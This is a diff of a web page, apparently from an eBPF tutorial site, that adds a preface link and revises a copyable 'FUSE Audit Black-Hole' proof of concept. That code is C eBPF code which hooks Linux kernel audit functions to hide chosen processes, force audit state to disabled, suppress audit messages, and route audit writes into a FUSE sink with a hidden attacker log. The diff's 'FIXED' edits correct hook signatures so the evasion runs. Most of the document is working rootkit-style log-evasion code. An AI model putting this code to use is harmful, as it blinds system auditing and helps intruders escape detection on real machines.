@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -737,6 +744,8 @@ graph TD
 436
 437
 438
+439
+440
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// FUSE Audit Black-Hole - eBPF exploitation proof of concept</span>
@@ -931,9 +940,9 @@ graph TD
     <span class="k">return</span> <span class="p">(</span><span class="n">ts</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">pid</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the start of audit event generation</span>
+<span class="c1">// FIXED: Hook the start of audit event generation</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_log_start"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_start</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_start</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">gfp_t</span> <span class="n">gfp_mask</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
@@ -941,12 +950,8 @@ graph TD
     <span class="n">u8</span> <span class="o">*</span><span class="n">hidden</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">hidden</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">hidden</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// This is a process we want to hide completely</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Attempt to short-circuit audit processing</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Let it continue but we'll intercept later</span>
     <span class="p">}</span>
-    
-    <span class="c1">// Get the audit event type</span>
-    <span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">type</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">type</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
     
     <span class="c1">// Check if this is an event type we want to hide</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">should_hide_event_type</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
@@ -975,17 +980,15 @@ graph TD
             
             <span class="c1">// Log the event for our analysis</span>
             <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
-            
-            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Attempt to short-circuit audit processing</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Let normal audit processing continue</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the audit rule matching function</span>
+<span class="c1">// FIXED: Hook audit rule filtering</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_filter_rule"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_filter</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_krule</span> <span class="o">*</span><span class="n">rule</span><span class="p">,</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_filter</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_krule</span> <span class="o">*</span><span class="n">rule</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>
                <span class="k">enum</span> <span class="n">audit_state</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
@@ -996,7 +999,7 @@ graph TD
         <span class="c1">// Force the state to AUDIT_DISABLED</span>
         <span class="k">enum</span> <span class="n">audit_state</span> <span class="n">disabled</span> <span class="o">=</span> <span class="n">AUDIT_DISABLED</span><span class="p">;</span>
         <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">disabled</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">disabled</span><span class="p">));</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
     <span class="p">}</span>
     
     <span class="c1">// Get command name</span>
@@ -1008,21 +1011,24 @@ graph TD
         <span class="c1">// Force the state to AUDIT_DISABLED</span>
         <span class="k">enum</span> <span class="n">audit_state</span> <span class="n">disabled</span> <span class="o">=</span> <span class="n">AUDIT_DISABLED</span><span class="p">;</span>
         <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">disabled</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">disabled</span><span class="p">));</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the netlink message sending function for audit</span>
+<span class="c1">// FIXED: Hook the netlink message sending function for audit</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_send_reply"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_send</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">seq</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span>
-               <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_send</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">request_skb</span><span class="p">,</span> <span class="kt">int</span> <span class="n">seq</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span>
+               <span class="kt">int</span> <span class="n">done</span><span class="p">,</span> <span class="kt">int</span> <span class="n">multi</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// This function sends audit messages to userspace via netlink</span>
     <span class="c1">// We can intercept and modify or drop messages here</span>
     
     <span class="c1">// Check if this is an event type we want to hide</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">should_hide_event_type</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Get current process info</span>
+        <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+        
         <span class="c1">// Generate a unique ID based on pid and seq</span>
         <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="p">((</span><span class="n">u64</span><span class="p">)</span><span class="n">pid</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">seq</span><span class="p">;</span>
         
@@ -1034,28 +1040,33 @@ graph TD
             
             <span class="c1">// Clean up our tracking</span>
             <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event_id</span><span class="p">);</span>
-            
-            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Attempt to prevent the message from being sent</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the audit log writing function</span>
+<span class="c1">// FIXED: Hook the audit log writing function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_log_end"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_end</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit_end</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_buffer</span> <span class="o">*</span><span class="n">ab</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
     <span class="c1">// Check if this is a process we're hiding</span>
     <span class="n">u8</span> <span class="o">*</span><span class="n">hidden</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">hidden</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">hidden</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Attempt to short-circuit audit processing</span>
+        <span class="c1">// Log that we're intercepting this audit end</span>
+        <span class="k">struct</span> <span class="n">audit_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">(),</span>
+            <span class="p">.</span><span class="n">redirected</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">};</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
     <span class="p">}</span>
     
-    <span class="c1">// Get the audit event type</span>
-    <span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 <span class="cp">### FUSE Implementation
 </span>
 <span class="err">```</span><span class="n">c</span>
@@ -1081,7 +1092,7 @@ graph TD
 <span class="k">static</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">hidden_log</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 
 <span class="c1">// Optional: Log hidden events to a file for the attacker's reference</span>
-<span class="k">static</span> <span class="kt">void</span> <span class="n">log_hidden_event</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">log_hidden_event</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">hidden_log</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">fwrite</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">hidden_log</span><span class="p">);</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">hidden_log</span><span class="p">);</span>
@@ -1090,7 +1101,7 @@ graph TD
 
 <span class="c1">// FUSE operations</span>
 
-<span class="k">static</span> <span class="kt">int</span> <span class="n">audit_sink_getattr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="n">stat</span> <span class="o">*</span><span class="n">stbuf</span><span class="p">,</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_getattr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="n">stat</span> <span class="o">*</span><span class="n">stbuf</span><span class="p">,</span>
                              <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">memset</span><span class="p">(</span><span class="n">stbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">stat</span><span class="p">));</span>
     
@@ -1110,7 +1121,7 @@ graph TD
     <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">static</span> <span class="kt">int</span> <span class="n">audit_sink_readdir</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">fuse_fill_dir_t</span> <span class="n">filler</span><span class="p">,</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_readdir</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">fuse_fill_dir_t</span> <span class="n">filler</span><span class="p">,</span>
                              <span class="kt">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">,</span>
                              <span class="k">enum</span> <span class="n">fuse_readdir_flags</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
@@ -1123,20 +1134,20 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">static</span> <span class="kt">int</span> <span class="n">audit_sink_open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">audit_sink_path</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
         <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">static</span> <span class="kt">int</span> <span class="n">audit_sink_read</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_read</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
                           <span class="kt">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Always return empty content</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">static</span> <span class="kt">int</span> <span class="n">audit_sink_write</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">audit_sink_write</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
                            <span class="kt">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fuse_file_info</span> <span class="o">*</span><span class="n">fi</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">audit_sink_path</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
         <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
@@ -1156,7 +1167,7 @@ graph TD
     <span class="p">.</span><span class="n">write</span>      <span class="o">=</span> <span class="n">audit_sink_write</span><span class="p">,</span>
 <span class="p">};</span>
 
-<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
     <span class="c1">// Open a hidden log file if desired</span>
     <span class="n">hidden_log</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/tmp/.hidden_audit.log"</span><span class="p">,</span> <span class="s">"a+"</span><span class="p">);</span>
     
@@ -1721,7 +1732,7 @@ while (!exiting) {
 33
 34
 35
-</pre></td><td class="rouge-code"><pre>    bpf_probe_read(&amp;type, sizeof(type), &amp;ctx-&gt;type);
+</pre></td><td class="rouge-code"><pre>    bpf_probe_read_kernel(&amp;type, sizeof(type), &amp;ctx-&gt;type);
     
     // Check if this is an event type we want to hide
     if (should_hide_event_type(type)) {
